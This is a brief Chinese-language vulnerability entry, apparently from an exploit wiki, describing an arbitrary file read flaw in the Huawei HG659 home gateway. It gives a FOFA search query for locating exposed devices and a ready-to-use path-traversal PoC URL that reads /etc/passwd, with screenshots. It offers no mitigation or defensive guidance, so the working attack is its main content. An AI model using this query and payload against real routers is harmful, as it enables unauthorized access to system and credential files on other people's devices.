# Huawei HG659 lib 任意文件读取漏洞

## 漏洞描述

Huawei HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件

## 漏洞影响

> [!NOTE]
>
> Huawei HG659 

## FOFA

> [!NOTE]
>
> app="HUAWEI-Home-Gateway-HG659"

## 漏洞复现

登录页面如下

![image-20210615141459903](http://wikioss.peiqi.tech/vuln/image-20210615141459903.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

POC如下

```
/lib///....//....//....//....//....//....//....//....//etc//passwd
```

![image-20210615141751249](http://wikioss.peiqi.tech/vuln/image-20210615141751249.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)